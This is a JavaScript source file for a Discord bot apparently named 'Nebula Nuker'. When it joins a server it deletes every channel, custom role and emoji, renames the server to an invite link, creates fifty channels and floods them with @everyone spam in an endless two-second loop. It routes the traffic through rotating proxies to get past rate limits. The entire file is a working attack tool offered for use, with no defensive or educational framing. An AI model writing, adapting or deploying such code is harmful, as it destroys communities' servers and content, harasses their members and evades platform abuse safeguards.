const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');
const fs = require('fs');
dotenv.config();

// ====== PROXY SETUP ======
let HttpProxyAgent;
try {
  const agentModule = require('https-proxy-agent');
  HttpProxyAgent = typeof agentModule === 'function'
    ? agentModule
    : agentModule.HttpProxyAgent || agentModule.default;
} catch (err) {
  console.warn('⚠️ Could not load https-proxy-agent:', err.message);
}

const { SocksProxyAgent } = require('socks-proxy-agent');

let proxies = [];
let currentProxyIndex = 0;

function loadProxies() {
  try {
    const data = fs.readFileSync('proxies.txt', 'utf-8');
    proxies = data
      .split(/\r?\n|\r/)
      .map(line => line.trim())
      .filter(line => line && !line.startsWith('#') && line.length > 5);
    console.log(`✅ Loaded ${proxies.length} proxies.`);
  } catch (err) {
    console.warn('⚠️ Could not read proxies.txt:', err.message);
    proxies = [];
  }
}

function getProxyAgent() {
  if (proxies.length === 0) return null;
  const proxy = proxies[currentProxyIndex];
  currentProxyIndex = (currentProxyIndex + 1) % proxies.length;

  if (proxy.startsWith('socks5://')) {
    return new SocksProxyAgent(proxy);
  } else {
    return HttpProxyAgent ? new HttpProxyAgent(proxy) : null;
  }
}

// Reload proxies every 5 minutes
setInterval(loadProxies, 5 * 60 * 1000);
loadProxies();

// ====== DISCORD BOT ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== CUSTOM REST + PROXY ======
const rest = client.rest;
const originalRequest = rest.request.bind(rest);

rest.request = async function(options) {
  const agent = getProxyAgent();
  if (agent) {
    options.agent = { https: agent };
  }
  return await originalRequest(options);
};

// ====== WEB SERVER (Keep Alive) ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Nuker is online and destroying servers...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on port ${PORT}`);
});

// ====== RATE LIMIT HANDLER ======
async function handleRateLimit(promiseFn, maxRetries = 3) {
  let retries = 0;
  while (retries <= maxRetries) {
    try {
      return await promiseFn();
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = Math.max(error.retry_after || 1000, 500);
        console.warn(`[RATELIMIT] Retrying after ${retryAfter}ms`);
        await new Promise(resolve => setTimeout(resolve, retryAfter * 1.2));
        retries++;
      } else {
        console.error('❌ Request failed:', error.message);
        return null;
      }
    }
  }
  console.error('❌ Max retries exceeded.');
  return null;
}

// ====== SPAM FUNCTION ======
async function sendWithProxy(channel, content, agent) {
  const options = {
    method: 'POST',
    path: `/channels/${channel.id}/messages`,
     { content },
    versioned: true,
  };

  if (agent) {
    options.agent = { https: agent };
  }

  try {
    await rest.request(options);
  } catch (error) {
    if (error.code === 429) {
      const retryAfter = error.retry_after || 1000;
      await new Promise(resolve => setTimeout(resolve, retryAfter * 1.2));
    }
    // Ignore other errors
  }
}

// ====== ON JOIN: NUKE & SPAM ======
client.on('guildCreate', async (guild) => {
  console.log(`🚨 Joined ${guild.name} (ID: ${guild.id}) — Running full nuke...`);

  // 🔒 Block your safe server
  const BLOCKED_GUILD_ID = '1345474714331643956';
  if (guild.id === BLOCKED_GUILD_ID) {
    console.log('🔒 Protected server. Leaving...');
    await guild.leave();
    return;
  }

  // Fetch self
  const me = await guild.members.fetch(client.user.id).catch(() => null);
  if (!me) return;

  const hasChannels = me.permissions.has('ManageChannels');
  const hasRoles = me.permissions.has('ManageRoles');
  const hasSend = me.permissions.has('SendMessages');

  if (!hasChannels || !hasRoles) {
    console.log(`❌ Missing critical perms in ${guild.name}. Leaving...`);
    await guild.leave();
    return;
  }

  try {
    // === 1. Delete all channels ===
    await Promise.all(
      guild.channels.cache
        .filter(ch => ch.type !== 4) // Skip categories
        .map(ch => handleRateLimit(() => ch.delete(), 2))
    );
    console.log(`🗑️ Deleted all channels in ${guild.name}`);

    // === 2. Delete all roles (except @everyone and managed) ===
    await Promise.all(
      guild.roles.cache
        .filter(r => r.name !== '@everyone' && !r.managed)
        .map(r => handleRateLimit(() => r.delete(), 2))
    );
    console.log('🛡️ Deleted custom roles');

    // === 3. Delete all emojis ===
    await Promise.all(
      guild.emojis.cache.map(e => handleRateLimit(() => e.delete(), 2))
    );
    console.log('🎨 Deleted emojis');

    // === 4. Rename server ===
    await handleRateLimit(() => guild.setName('discord.gg/migh'), 2);
    console.log('📛 Server renamed');

    // === 5. Create 50 channels ===
    const channelName = 'neb-was-here';
    const createdChannels = [];

    for (let i = 0; i < 50; i++) {
      const ch = await handleRateLimit(
        () => guild.channels.create({ name: `${channelName}-${i + 1}` }),
        2
      );
      if (ch) createdChannels.push(ch);
    }

    if (createdChannels.length === 0) {
      console.log('❌ Failed to create any channels.');
      return;
    }

    console.log(`✅ Created ${createdChannels.length} channels. Starting spam...`);

    // === 6. SPAM: 20 messages per channel with proxy rotation ===
    const spamMessage = '@everyone discord.gg/migh - Nebula is back 🔥';
    const allSpamPromises = [];

    for (const channel of createdChannels) {
      const proxyAgent = getProxyAgent(); // 1 proxy per channel

      for (let i = 0; i < 20; i++) {
        allSpamPromises.push(
          sendWithProxy(channel, spamMessage, proxyAgent).catch(() => {})
        );
      }
    }

    // Fire all spam at once
    await Promise.allSettled(allSpamPromises);
    console.log(`💥 Spammed ~${allSpamPromises.length} messages across ${createdChannels.length} channels!`);

    // === 7. CONTINUE SPAM LOOP (EVERY 2 SECONDS) ===
    setInterval(async () => {
      const livePromises = [];
      for (const channel of createdChannels) {
        const proxyAgent = getProxyAgent();
        livePromises.push(
          sendWithProxy(channel, spamMessage, proxyAgent).catch(() => {})
        );
      }
      await Promise.allSettled(livePromises);
      console.log(`🔁 Ongoing spam: ${livePromises.length} messages sent`);
    }, 2000); // Every 2 seconds

  } catch (err) {
    console.error('❌ Nuke failed:', err.message || err);
  }
});

// ====== BOT READY ======
client.on('ready', () => {
  console.log(`🚀 Logged in as ${client.user.tag}`);
  client.user.setActivity('Nuking servers', { type: 'PLAYING' });
});

// ====== LOGIN ======
client.login(process.env.TOKEN).catch(err => {
  console.error('❌ Failed to log in:', err.message);
});
